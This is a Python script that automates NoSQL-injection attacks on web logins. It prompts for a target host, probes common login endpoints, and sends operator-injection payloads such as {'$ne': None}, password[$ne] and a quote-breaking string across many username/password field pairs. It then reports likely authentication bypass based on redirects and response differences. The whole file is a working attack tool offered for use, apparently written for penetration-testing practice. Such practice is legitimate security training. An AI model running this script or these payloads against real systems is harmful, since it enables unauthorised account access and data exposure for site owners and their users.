import requests
import logging
from colorama import Style, Fore
from http.client import HTTPConnection
from requests.sessions import Session
from time import sleep
from functools import wraps


#Creating a log file in case something go wrong (And for evidence in case something happen to Client [This is a real story from CPTS documents module hhh]
logging.basicConfig(
    filename="nosql-logfile.txt",
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)


#This function is to log all the requsts with their perspective responses in a separate full fulllog.txt

def enable_full_http_logging(log_file="fulllog.txt"):
    logger = logging.getLogger("full_http")
    logger.setLevel(logging.DEBUG)
    logger.propagate = False

  
    for h in list(logger.handlers):
        logger.removeHandler(h)

    file_handler = logging.FileHandler(log_file, mode="a", encoding="utf-8")
    file_handler.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s | %(message)s")
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)

  
    original_send = Session.send

    @wraps(original_send)
    def logging_send(self, request, **kwargs):
        try:
            # Log request line + headers + body
            logger.debug("---- REQUEST ----")
            logger.debug("send: %s %s HTTP/1.1", request.method, request.url)
            for k, v in request.headers.items():
                logger.debug("header: %s: %s", k, v)
            if request.body:
                body = request.body
                if isinstance(body, bytes):
                    try:
                        body = body.decode('utf-8', errors='replace')
                    except Exception:
                        body = repr(body)
                logger.debug("body: %s", body)
            else:
                logger.debug("body: <empty>")

        except Exception as e:
            logger.debug("Error logging request: %s", e)

  
        response = original_send(self, request, **kwargs)

        try:
    
            logger.debug("---- RESPONSE ----")
            logger.debug("reply: HTTP/1.1 %s %s", response.status_code, response.reason)
            for k, v in response.headers.items():
                logger.debug("header: %s: %s", k, v)
   
            if response.content:
                logger.debug("body: %s", response.text)
            else:
                logger.debug("body: <empty>")
            logger.debug("=" * 80)
 
            for h in logger.handlers:
                try:
                    h.flush()
                except Exception:
                    pass
        except Exception as e:
            logger.debug("Error logging response: %s", e)

        return response

  
    Session.send = logging_send
    
   
   

green=f"{Style.BRIGHT}{Fore.GREEN}[+]"
blue=f"{Style.BRIGHT}{Fore.BLUE}[*]{Style.RESET_ALL}"
red=f"{Style.BRIGHT}{Fore.RED}[-]{Style.RESET_ALL}"
yellow=f"{Style.BRIGHT}{Fore.YELLOW}[*]{Style.RESET_ALL}"


# This function is to clean the responses (Json or Html)
def pretty_response(resp, max_len=300):
    ct = resp.headers.get("Content-Type", "")

    # JSON response
    if "application/json" in ct:
        try:
            return resp.json()
        except Exception:
            return "[!] Invalid JSON response"

    # Non-JSON (HTML / text)
    text = resp.text.strip()
    if not text:
        return "[!] Empty response"

    return "[!] Not a Json format"



# Automating possible login endpoints
def finding_LoginPage(url):
  
   found_endpoints = []
   try:
      endpoints = ['login','auth/login','login.php', 'admin.php', 'graphql/login','api/login', 'admin', '']
    #Sometimes I found the login page in the root page lol (exp:http://exemple.com/)
   
      for end in endpoints:
         url=f"http://{target}/{end}"
         logging.info(f"[*] Trying Url : {url}")
         loginreq = requests.get(url, timeout=4)
         loginpost = requests.post(url, timeout=4)
         
         if loginreq.status_code in [200, 405]:
             print(f"    {yellow} Endpoint Found {url} with Status Code {loginreq.status_code}")
             logging.info(f"[*] Get Response : {loginreq.text}\n\n")
             found_endpoints.append(url)
             continue
             
         if loginpost.status_code in [200,403]:
             print(f"    {yellow} Endpoint Found {url} with Status Code {loginpost.status_code}")
             logging.info(f"[*] Post response : {loginreq.text}\n\n")
             found_endpoints.append(url)
             continue
             
             
   except requests.exceptions.ConnectionError:
         print(f"{red} Connection failed: {url}")
         logging.info("===Automation Finished with Connection Failed===\n\n\n")
         return False
         
   except requests.exceptions.Timeout:
         print(f"{red} Timeout: {url}")
         logging.info("===Automation Finished With Timeout===\n\n\n")
         return False
         
   except Exception as e:
         return False
   return found_endpoints


def nosql_parameters(url):
    
    """Try common parameter combinations to discover what the API expects"""
    sleep(1)
    print(f"\n\n{blue} Enumeration and Exploitation: Attempting to discover API parameters for {url} and using NoSql payload ...\n")
    logging.info(f"[*] Attempting to discover API parameters for {url}\n")
    # Common parameter name combinations, We could add more in the future or even better using AI to check them automatically
    common_combos = [
        ['login', 'password'],
        ['username', 'password'],
        ['email', 'password'],
        ['user', 'pass'],
        ['username', 'pass'],
        ['email', 'pass'],
        ['user', 'password']
    ]
    
    baseline_response = None
 #   print(f"{blue} Trying parameters with nosql payload ...\n")
 
 
    for combo in common_combos:
		
        logging.info(f"[*] Trying parameters: {combo}\n")
        # Creating test payload with dummy credentials
        
        dummy_payload1 = {combo[0]: "admin@admin.com", combo[1]: "Password123@"}
        dummy_payload2 = {combo[0]:"admin@admin.com", combo[1]:"Password123@"}
        #I don't know why I repete it twice but anyway


        logging.info(dummy_payload1)
        logging.info(dummy_payload2)
        
        # Creating NoSQL injection payload, Here we could add a list of Nosql Payload , those three are the one I found the most
        nosql_payload1 = {combo[0]: {"$ne": None}, combo[1]: {"$ne": None}}
        nosql_payload2 = {combo[0]:"admin' || '' === '", combo[1]:"Password123@"}
        nosql_payload21 = {combo[0]:"admin", f"{combo[1]}[$ne]":"admin"}
        
        logging.info(nosql_payload1)
        logging.info(nosql_payload2)
        logging.info(nosql_payload21)
        
     #   password[$ne]=admin 
        
        
        try:

            # ===== TEST 1: Dummy credentials =====
            logging.info(f"    Testing dummy credentials...")
            
            # Well Sometimes the request freezes which break the automation, That's Why I use try/except to continue the script as normal
            try:
                dummy_resp1 = requests.post(url, json=dummy_payload1, timeout=10, allow_redirects=False)
                logging.info(f"    Dummy - Status: {dummy_resp1.status_code}, Length: {len(dummy_resp1.text)}")
                
            except requests.exceptions.Timeout:
                logging.warning(f"    Dummy request timed out, skipping this parameter combo")
            
            except Exception as e:
                logging.warning(f"    Dummy request failed: {e}, skipping this parameter combo")
               
            
            try:
                dummy_resp2 = requests.post(url, data=dummy_payload2, timeout=10, allow_redirects=False)
                logging.info(f"    Dummy - Status: {dummy_resp2.status_code}, Length: {len(dummy_resp2.text)}")
            
            except requests.exceptions.Timeout:
                logging.warning(f"    Dummy request timed out, skipping this parameter combo")
            
            except Exception as e:
                logging.warning(f"    Dummy request failed: {e}, skipping this parameter combo")
              


            try:
                nosql_resp1 = requests.post(url, json=nosql_payload1, timeout=10, allow_redirects=False)
                logging.info(f"    NOSQL - Status: {nosql_resp1.status_code}, Length: {len(nosql_resp1.text)}")
           
            except requests.exceptions.Timeout:
                logging.warning(f"    NOSQL request timed out, skipping this parameter combo")
           
            except Exception as e:
                logging.warning(f"    NOSQL request failed: {e}, skipping this parameter combo")
                
            
            try:
                nosql_resp2 = requests.post(url, data=nosql_payload2, timeout=10, allow_redirects=False)
                logging.info(f"    NOSQL - Status: {nosql_resp2.status_code}, Length: {len(nosql_resp2.text)}")
          
            except requests.exceptions.Timeout:
                logging.warning(f"    NOSQL request timed out, skipping this parameter combo")
          
            except Exception as e:
                logging.warning(f"    NOSQL request failed: {e}, skipping this parameter combo")
            
            try:
                nosql_resp21 = requests.post(url, data=nosql_payload21, timeout=10, allow_redirects=False)
                logging.info(f"    NOSQL - Status: {nosql_resp21.status_code}, Length: {len(nosql_resp21.text)}")
         
            except requests.exceptions.Timeout:
                logging.warning(f"    NOSQL request timed out, skipping this parameter combo")
         
            except Exception as e:
                logging.warning(f"    NOSQL request failed: {e}, skipping this parameter combo")

                
                
      #      logging.info(f"    Dummy - Status: {dummy_resp2.status_code}, Length: {dummy_resp2.text}\n")
      #      logging.info(f"    NoSQL - Status: {nosql_resp2.status_code}, Length: {nosql_resp2.text}\n\n\n")
            
            response_out1 = pretty_response(nosql_resp1)
            response_out2 = pretty_response(nosql_resp2)
            response_out21 = pretty_response(nosql_resp21)
            
            
            # Checking for redirect (301, 302, etc.)
            if nosql_resp1.status_code in [301, 302, 303, 307, 308]:
				
                if nosql_resp1.headers.get('Location', 'N/A') == "/":
                   logging.info(f"This is a Rediredication of parameters {combo} to {nosql_resp1.headers.get('Location', 'N/A')}")
                   
                   #Sometimes there is a redirection but for a failed attempt (for exemple /login?error=Invalid...  
                elif "?" in nosql_resp1.headers.get('Location', 'N/A'):
                   logging.info(f"Skipping - redirected back to login: {nosql_resp1.headers.get('Location', 'N/A')}")
                  
                  #If redirection is detected for none default root endpoint then write the location
                else:    
                   print(f"{green} Vulnerability DETECTED! Parameters found: {combo}{Style.RESET_ALL}")
                   print(f"    Location: {nosql_resp1.headers.get('Location', 'N/A')}")
                   return combo
                   
                   
            #Same for all payloads
            if nosql_resp2.status_code in [301, 302, 303, 307, 308]:
                if nosql_resp2.headers.get('Location', 'N/A') == "/":
                   logging.info(f"This is a Rediredication of parameters {combo} to {nosql_resp2.headers.get('Location', 'N/A')}")
                  
                elif "?" in nosql_resp2.headers.get('Location', 'N/A'):
                   logging.info(f"Skipping - redirected back to login: {nosql_resp2.headers.get('Location', 'N/A')}")
                   
                else:       
                   print(f"{green} Vulnerability DETECTED! Parameters found: {combo}{Style.RESET_ALL}")
                   print(f"    Location: {nosql_resp2.headers.get('Location', 'N/A')}")
                   return combo
                   
                   
            if nosql_resp21.status_code in [301, 302, 303, 307, 308]:
                if nosql_resp21.headers.get('Location', 'N/A') == "/":
                   logging.info(f"This is a Rediredication of parameters {combo} to {nosql_resp21.headers.get('Location', 'N/A')}")
                  
                elif "?" in nosql_resp21.headers.get('Location', 'N/A'):
                   logging.info(f"Skipping - redirected back to login: {nosql_resp21.headers.get('Location', 'N/A')}")
                   
                else:       
                   print(f"{green} Vulnerability DETECTED! Parameters found: {combo}{Style.RESET_ALL}")
                   print(f"    Location: {nosql_resp21.headers.get('Location', 'N/A')}")
                   return combo
                   
                   
                   
            # Check if NoSQL response is different from dummy and successful for the nosql request
            if nosql_resp1.status_code == 200 and dummy_resp1.status_code != 200:
                print(f"{green} High probability NoSQL injection (heuristic) detected with parameters: {combo} and response {response_out1}{Style.RESET_ALL}")
                return combo
            
            
            # Check if response length is significantly way different
            if nosql_resp1.status_code == 200 and abs(len(nosql_resp1.text) - len(dummy_resp1.text)) > 100:
                print(f"{green} High probability NoSQL injection (heuristic) detected with parameters: {combo} and response {response_out1}{Style.RESET_ALL}")
                return combo
            
       
            if nosql_resp2.status_code == 200 and dummy_resp2.status_code != 200:
                print(f"{green} High probability NoSQL injection (heuristic) detected with parameters: {combo} and response {response_out2}{Style.RESET_ALL}")
                return combo
            
            if nosql_resp2.status_code == 200 and abs(len(nosql_resp2.text) - len(dummy_resp2.text)) > 100:
                print(f"{green} High probability NoSQL injection (heuristic) detected with parameters: {combo} and response {response_out2}{Style.RESET_ALL}")
                return combo
       
   
   
            if nosql_resp21.status_code == 200 and dummy_resp2.status_code != 200:
                print(f"{green} High probability NoSQL injection (heuristic) detected with parameters: {combo} and response {response_out21}{Style.RESET_ALL}")
                return combo
            
            if nosql_resp21.status_code == 200 and abs(len(nosql_resp21.text) - len(dummy_resp2.text)) > 100:
                print(f"{green} High probability NoSQL injection (heuristic) detected with parameters: {combo} and response {response_out21}{Style.RESET_ALL}")
                return combo
            
            # Storing first response as baseline
            if baseline_response is None:
                baseline_response = dummy_resp2.status_code
                
        except Exception as e:
            print(f"\n{red} Error: {e}")
            continue
    
    print(f"    {red} Could not automatically determine parameters")
    return None
    
    
    
if __name__ == "__main__":
    
    enable_full_http_logging("fulllog.txt")
    target = input("\nPlease enter the target without ['http://']: ")
    logging.info("===Starting Automation===\n")
    
    # Step 1: Finding login endpoints
    print(f"\n\n{blue} Reconnaissance: Finding login endpoints...\n")
    endpoints = finding_LoginPage(target)
    
    if not endpoints:
        print(f"{red} No Get login endpoints found")
        logging.info("===Automation Finished===\n\n\n")

        exit(-1) 
 
    for endpoint in endpoints:
    #   print(f"\n\n{blue} Testing {endpoint}")
        params = nosql_parameters(endpoint)
        
        
    logging.info(f"===Automation Finished for {target} ===\n\n\n")


